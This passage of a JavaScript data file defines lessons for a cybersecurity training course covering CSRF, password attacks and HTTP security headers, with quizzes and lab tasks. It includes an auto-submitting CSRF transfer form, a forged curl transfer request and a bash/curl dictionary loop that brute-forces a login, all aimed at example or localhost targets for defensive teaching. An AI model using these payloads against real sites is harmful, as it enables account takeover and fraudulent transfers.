1. Victim logs into \`mybank.com\`. The browser stores \`Cookie: session=ValidSession123\`.
2. Victim opens \`evil-recipe.com\` in another tab.
3. The evil page contains hidden HTML that auto-submits on load:
\`\`\`html
<form action="https://mybank.com/transfer" method="POST" id="csrfForm">
  <input type="hidden" name="to" value="AttackerAccount">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.getElementById('csrfForm').submit();</script>
\`\`\`
4. Because the request is heading to \`mybank.com\`, the victim's browser automatically attaches \`session=ValidSession123\`!
The bank cannot tell whether the victim clicked 'Transfer' or if the recipe blog forced the click.`
      },
      {
        title: "2. The Modern Defense: Anti-CSRF Tokens & SameSite",
        content: `• **Anti-CSRF Tokens**: The bank generates a random secret token (e.g. \`csrf_token=9a8f2...\`) and embeds it inside the real transfer form. The evil recipe blog cannot read this token because browsers enforce the Same-Origin Policy (SOP). When the form submits without the valid token, the server rejects it!
• **SameSite=Lax/Strict Cookies**: Modern browsers do not attach SameSite cookies to cross-origin form submissions, stopping the attack at the browser layer!`
      }
    ],
    seeExamples: [
      {
        title: "Anti-CSRF Token Validation Flow",
        codeOrDiagram: `[ Genuine Bank Form ]
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="secret_random_token_xyz">
  <button type="submit">Transfer</button>
</form>

[ Server Verification ]
if (req.body.csrf_token !== session.expected_token) {
  return res.status(403).send("CSRF Attack Detected!");
}`,
        explanation: "Because an external site cannot read the victim's CSRF token, any forged request will be missing the valid token."
      }
    ],
    tryInteractive: {
      type: "terminal",
      prompt: "Simulate submitting a state-changing money transfer request without an Anti-CSRF token using curl: `curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer`:",
      initialCommand: "",
      expectedCommand: "curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer",
      simulatedOutput: "HTTP/1.1 403 Forbidden\n{\"error\":\"CSRF_TOKEN_MISSING\",\"message\":\"State-changing operation rejected. Missing Anti-CSRF token.\"}\n[+] Success! The server successfully detected and blocked the forged request.",
      explanation: "The server inspected the payload, found no matching Anti-CSRF token, and safely rejected the transaction with HTTP 403."
    },
    questions: [
      {
        id: "r28-q1",
        type: "multiple-choice",
        question: "Why does an Anti-CSRF token prevent external third-party websites from executing forged requests against a victim's bank?",
        options: [
          "Because third-party websites cannot use HTTPS",
          "Because the Same-Origin Policy prevents the external attacker's website from reading the random secret token from the victim's bank page",
          "Because Anti-CSRF tokens reboot the server every 5 seconds",
          "Because tokens can only be typed on physical keyboards"
        ],
        correctIndex: 1,
        explanation: "Due to the browser's Same-Origin Policy, an external website cannot read content from another origin, meaning it cannot know or guess the valid token."
      },
      {
        id: "r28-q2",
        type: "multiple-choice",
        question: "Which cookie attribute ensures that a session cookie will NOT be sent on cross-site POST form submissions, defending against CSRF?",
        options: [
          "SameSite=Lax (or SameSite=Strict)",
          "Path=/",
          "Domain=localhost",
          "Max-Age=3600"
        ],
        correctIndex: 0,
        explanation: "`SameSite=Lax` and `SameSite=Strict` instruct the browser not to attach the cookie to cross-origin form submissions or requests."
      }
    ],
    tasks: [
      {
        title: "Task 1: Verify Anti-CSRF Token Enforcement",
        instruction: "Submit `curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer` to confirm the defense is active.",
        hints: [
          "Concept: Test Anti-CSRF protection.",
          "Direction: Submit transfer without csrf_token parameter.",
          "Tool: `curl`",
          "Syntax: `curl -d \"to=attacker&amount=500\" http://localhost:8080/api/transfer`",
          "Explanation: Expect HTTP 403 Forbidden."
        ]
      }
    ],
    explainResult: "The endpoint middleware verified the presence of `X-CSRF-Token` or form token, failed to match against the session store, and halted execution.",
    securityConnection: "CSRF vulnerabilities have historically allowed attackers to silently change user email addresses, alter Wi-Fi router DNS servers, or trigger unauthorized financial transactions simply by having the victim view an image on a forum.",
    practicalRoomLink: {
      label: "Ready for hands-on practice?",
      buttonText: "Open Practical Cross-Site Request Forgery Lab",
      url: "labs.html?lab=csrf"
    },
    completion: {
      learned: [
        "The mechanics of Cross-Site Request Forgery (CSRF)",
        "The concept of ambient cookie authority in web browsers",
        "The Synchronizer Anti-CSRF Token defense pattern",
        "The role of SameSite cookie attributes (Strict, Lax, None)"
      ],
      practiced: [
        "curl -d \"to=attacker...\"",
        "Verifying CSRF token validation",
        "Analyzing cross-origin cookie behaviors"
      ]
    },
    nextRoomId: "room-29"
  },

  {
    id: "room-29",
    stage: 6,
    stageTitle: "Stage 6 — Web Security",
    title: "Authentication Security & Password Attacks",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    estimatedTime: "35 min",
    prerequisites: "Room 16 (Authentication & Authorization) & Room 23 (Web Security Fundamentals)",
    whyAreYouHere: "Passwords remain the primary mechanism for identity verification on the internet, which makes authentication portals the #1 target for automated brute-force attacks. If an application allows infinite login guesses without delay or lockout, any account with a standard password will eventually fall. In this room, you will learn the differences between Dictionary Attacks, Brute Force, and Credential Stuffing, and how rate limiting and account lockouts protect users.",
    objectives: [
      "Differentiate between Brute-Force Attacks, Dictionary Attacks, and Password Spraying",
      "Understand why sequential account lockouts can lead to Denial of Service",
      "Learn adaptive Rate Limiting and progressive throttling (exponential backoff)",
      "Master password hashing requirements: Salt, Work Factor, and algorithms (bcrypt, Argon2)",
      "Simulate password dictionary cracking against an authentication endpoint"
    ],
    vocabulary: [
      { term: "Brute-Force Attack", definition: "Systematically trying every possible combination of characters (a, b, c... aa, ab) until the correct password is found." },
      { term: "Dictionary Attack", definition: "Testing passwords from a pre-compiled wordlist of commonly used passwords (like `rockyou.txt` or company-specific lists)." },
      { term: "Password Spraying", definition: "Testing one single common password (like `Summer2026!`) against thousands of user accounts to avoid triggering lockout thresholds." },
      { term: "Salt", definition: "A unique, cryptographically random string appended to each password before hashing to ensure identical passwords produce completely different hashes." },
      { term: "Rate Limiting", definition: "Restricting the number of requests a client can make to a specific endpoint within a defined window of time." }
    ],
    lessons: [
      {
        title: "1. The Password Attack Spectrum",
        content: `• **Dictionary Attack**: Tries 100,000 common passwords against user \`alice\`.
  - *Defense*: Account locks after 5 attempts.
• **Password Spraying**: Tries \`Welcome2026!\` against 10,000 different user accounts (1 attempt per user).
  - *Result*: Locks out nobody, but successfully cracks the 2-3% of users who chose that seasonal password!
• **Offline Hash Cracking**: Attacker steals the database hash dump and runs billions of guesses per second on local GPU rigs using Hashcat.`
      },
      {
        title: "2. Password Hashing: Why MD5/SHA-256 is Broken for Passwords",
        content: `Standard cryptographic hashes (SHA-256) are designed to be **fast** (calculating billions of hashes per second for file integrity).
For passwords, you want the hash to be **deliberately slow and computationally expensive**!
Modern password algorithms (**bcrypt**, **Argon2id**, **PBKDF2**) include:
1. **Work Factor (Cost)**: Tunable CPU/memory cost that makes GPU guessing slow.
2. **Salt**: Automatically generated random bytes that defeat pre-computed Rainbow Tables.`
      }
    ],
    seeExamples: [
      {
        title: "Salted Hash Transformation",
        codeOrDiagram: `Password: "Secret123"
Salt:     "x8A19zQ!" (Randomly generated for Alice)
Stored in DB: $2b$12$x8A19zQ!h8fa9z... (bcrypt format)

Bob ALSO has password: "Secret123"
Salt:     "m3K01vL?" (Randomly generated for Bob)
Stored in DB: $2b$12$m3K01vL?p9w12c... (Completely different hash!)`,
        explanation: "Even though Alice and Bob have the exact same password, unique salts ensure their stored hashes look completely different."
      }
    ],
    tryInteractive: {
      type: "terminal",
      prompt: "Simulate testing a wordlist against the lab login API until the correct password is identified: `for p in admin 123456 password dragon letmein; do echo -n \"$p: \"; curl -s -d \"user=cadet&pass=$p\" http://localhost:8080/login | grep -o '\"message\":[^,]*'; done`:",
      initialCommand: "",
      expectedCommand: "for p in admin 123456 password dragon letmein; do echo -n \"$p: \"; curl -s -d \"user=cadet&pass=$p\" http://localhost:8080/login | grep -o '\"message\":[^,]*'; done",
      simulatedOutput: "admin: \"message\":\"Invalid credentials\"\n123456: \"message\":\"Invalid credentials\"\npassword: \"message\":\"Invalid credentials\"\ndragon: \"message\":\"Invalid credentials\"\nletmein: \"message\":\"Login successful. Session established.\"\n[+] Success! Valid password 'letmein' recovered via dictionary iteration.",
      explanation: "Automating HTTP submissions with shell loops or tools like Hydra / ffuf tests multiple candidates quickly."
    },
    questions: [
      {
        id: "r29-q1",
        type: "multiple-choice",
        question: "Why should developers use slow hashing algorithms like bcrypt or Argon2 instead of fast algorithms like SHA-256 for storing user passwords?",
        options: [
          "Because bcrypt uses less hard drive space",
          "Because fast algorithms allow attackers with modern GPU cracking rigs to test billions of guesses per second, whereas slow algorithms make offline cracking computationally infeasible",
          "Because SHA-256 can only hash numbers, not letters",
          "Because bcrypt is open-source while SHA-256 is proprietary"
        ],
        correctIndex: 1,
        explanation: "Slow hashing algorithms enforce high computational and memory costs, slowing offline GPU dictionary attacks to a crawl."
      },
      {
        id: "r29-q2",
        type: "multiple-choice",
        question: "What is the primary objective of an attacker performing a 'Password Spraying' attack instead of a traditional brute-force attack?",
        options: [
          "To test millions of complex passwords against the CEO's account",
          "To test a single commonly used password against thousands of distinct user accounts, staying below account lockout thresholds",
          "To overflow the web server's memory buffer",
          "To change the DNS records of the target domain"
        ],
        correctIndex: 1,
        explanation: "Password spraying avoids triggering account lockout policies by testing only 1 or 2 attempts per user before moving on."
      }
    ],
    tasks: [
      {
        title: "Task 1: Execute Dictionary Login Probe",
        instruction: "Run the shell dictionary loop against the login API to identify the valid password.",
        hints: [
          "Concept: Automated dictionary testing.",
          "Direction: Loop through passwords until HTTP 200.",
          "Tool: Bash loop with `curl`",
          "Syntax: Run the provided multi-password loop.",
          "Explanation: Isolates valid credential."
        ]
      }
    ],
    explainResult: "The script submitted sequential POST requests. The fifth candidate matched the bcrypt hash stored in the user record, returning a valid session token.",
    securityConnection: "Credential attacks account for over 80% of all web breaches. Implementing Multi-Factor Authentication (MFA), enforcing NIST 800-63B password complexity standards, and deploying rate-limiting with CAPTCHA are core responsibilities of security engineering.",
    practicalRoomLink: {
      label: "Ready for hands-on practice?",
      buttonText: "Open Practical Authentication & Brute Force Lab",
      url: "labs.html?lab=auth"
    },
    completion: {
      learned: [
        "The mechanics of Brute Force, Dictionary, and Password Spraying attacks",
        "Why fast hashing (MD5, SHA-256) is dangerous for passwords",
        "The role of Salts and Work Factors in bcrypt and Argon2",
        "Defenses: Rate limiting, exponential backoff, and MFA"
      ],
      practiced: [
        "Automated dictionary testing via curl",
        "Analyzing authentication response patterns",
        "Evaluating password storage architectures"
      ]
    },
    nextRoomId: "room-30"
  },

  {
    id: "room-30",
    stage: 6,
    stageTitle: "Stage 6 — Web Security",
    title: "HTTP Security Headers & Browser Defenses",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    estimatedTime: "30 min",
    prerequisites: "Room 12 (HTTP Fundamentals) & Room 26 (Cross-Site Scripting)",
    whyAreYouHere: "You now understand how web applications operate and how vulnerabilities like XSS, Clickjacking, and Session Theft arise. But did you know that the server can instruct the user's browser to activate built-in security shields? By sending specific **HTTP Security Headers**, a web server can block malicious scripts, enforce HTTPS connections, and prevent Clickjacking with zero client plugins! In this room, you will master CSP, HSTS, X-Frame-Options, and X-Content-Type-Options.",
    objectives: [
      "Understand Defense-in-Depth and the role of browser security headers",
      "Master Content Security Policy (CSP): restricting script sources and preventing XSS",
      "Learn HTTP Strict Transport Security (HSTS): eliminating SSL stripping and downgrade attacks",
      "Prevent Clickjacking using `X-Frame-Options` and `frame-ancestors`",
      "Audit and grade security headers on a live web server"
    ],
    vocabulary: [
      { term: "HTTP Security Header", definition: "A response header sent by a web server that instructs the client browser to enable specific security policies and defenses." },
      { term: "CSP (Content Security Policy)", definition: "A powerful HTTP header that restricts the domains from which scripts, styles, images, and other resources can be loaded or executed." },
      { term: "HSTS (Strict-Transport-Security)", definition: "A header that forces the browser to communicate exclusively over encrypted HTTPS, never allowing unencrypted HTTP fallbacks." },
      { term: "Clickjacking", definition: "A malicious technique of tricking a user into clicking something different from what they perceive, typically using transparent iframes." },
      { term: "X-Frame-Options", definition: "A header (`DENY` or `SAMEORIGIN`) that prevents a web page from being rendered inside an `<iframe>` on an external site." },
      { term: "X-Content-Type-Options: nosniff", definition: "A header that prevents browsers from MIME-sniffing a response away from the declared Content-Type." }
    ],
    lessons: [
      {
        title: "1. The Essential Four Headers",
        content: `Every modern production web application should send these four headers:
1. **Content-Security-Policy**:
   \`Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com;\`
   Blocks any inline scripts (\`<script>alert(1)</script>\`) or external scripts injected by attackers!
2. **Strict-Transport-Security (HSTS)**:
   \`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\`
   Tells the browser: *"Remember for 1 year to NEVER connect to this domain over HTTP, even if the user types http://."*
3. **X-Frame-Options**:
   \`X-Frame-Options: DENY\`
   Prevents malicious websites from framing your login page inside a transparent iframe (Clickjacking defense).
4. **X-Content-Type-Options**:
   \`X-Content-Type-Options: nosniff\`
   Stops browsers from executing an uploaded image file as executable HTML or JavaScript.`
      }
    ],
    seeExamples: [
      {
        title: "Auditing Headers with curl -I",
        codeOrDiagram: `cadet@endlessus:~$ curl -I https://endlessus.in
HTTP/2 200 
server: GitHub.com
content-type: text/html; charset=utf-8
strict-transport-security: max-age=31536000
x-content-type-options: nosniff
x-frame-options: DENY
referrer-policy: strict-origin-when-cross-origin`,
        explanation: "Notice the security posture: HSTS enforces HTTPS, X-Frame-Options blocks framing, and nosniff prevents MIME confusion."
      }
    ],
    tryInteractive: {
      type: "terminal",
      prompt: "Audit the HTTP response headers of our lab server using `curl -I http://localhost:8080` to identify missing security headers:",
      initialCommand: "",
      expectedCommand: "curl -I http://localhost:8080",
      simulatedOutput: "HTTP/1.1 200 OK\nServer: Apache/2.4.52\nContent-Type: text/html\n[!] Warning: Missing Content-Security-Policy!\n[!] Warning: Missing Strict-Transport-Security!\n[!] Warning: Missing X-Frame-Options! Vulnerable to Clickjacking.\n[+] Success! Security header audit complete. Grade: F (Insecure configuration).",
      explanation: "Using `curl -I` allows security auditors to rapidly evaluate an organization's defense-in-depth header posture."
    },
    questions: [
      {
        id: "r30-q1",
        type: "multiple-choice",
        question: "An attacker creates a malicious webpage that loads an online banking transfer form inside a completely invisible, transparent `<iframe>` overlaid directly on top of a 'Click here to win a free iPhone' button. What attack is being performed?",
        options: [
          "SQL Injection",
          "Clickjacking (UI Redressing)",
          "Buffer Overflow",
          "ARP Spoofing"
        ],
        correctIndex: 1,
        explanation: "Clickjacking uses transparent iframes to trick users into clicking buttons they cannot see. It is mitigated by `X-Frame-Options: DENY`."
      },
      {
        id: "r30-q2",
        type: "multiple-choice",
        question: "Which HTTP header instructs the browser to never execute inline scripts or load JavaScript from unauthorized external domains?",
        options: [
          "Content-Security-Policy (CSP)",
          "Server",
          "Accept-Encoding",
          "User-Agent"
        ],
        correctIndex: 0,
        explanation: "Content Security Policy (CSP) defines approved sources for executable scripts, stylesheets, and images."
      }
    ],
    tasks: [
      {
        title: "Task 1: Audit Target Security Headers",
        instruction: "Execute `curl -I http://localhost:8080` to inspect which defensive headers are configured.",
        hints: [
          "Concept: HTTP header posture evaluation.",
          "Direction: Use the `-I` head flag with curl.",
          "Tool: `curl`",
          "Syntax: `curl -I http://localhost:8080`",
          "Explanation: Checks for CSP, HSTS, and X-Frame-Options."
        ]
      }
    ],
    explainResult: "The `curl` command parsed the response headers returned by the Apache server, exposing the total absence of browser security controls.",
    securityConnection: "Security header auditing is an automated part of every penetration test and compliance audit. Tools like Mozilla Observatory or `securityheaders.com` grade domains from A+ to F based on their header configuration.",
    practicalRoomLink: {
      label: "Ready for hands-on practice?",
      buttonText: "Open Practical HTTP Security Headers Lab",
      url: "labs.html?lab=headers"
    },
    completion: {
      learned: [
        "The concept of Defense-in-Depth via browser security headers",
        "Restricting script injection with Content-Security-Policy (CSP)",
        "Enforcing encrypted connections using HSTS",
        "Mitigating Clickjacking with X-Frame-Options"
      ],
      practiced: [
        "curl -I",
        "Auditing security header configurations",
        "Evaluating browser security postures"
      ]
    },
    nextRoomId: "room-31"
  }
];
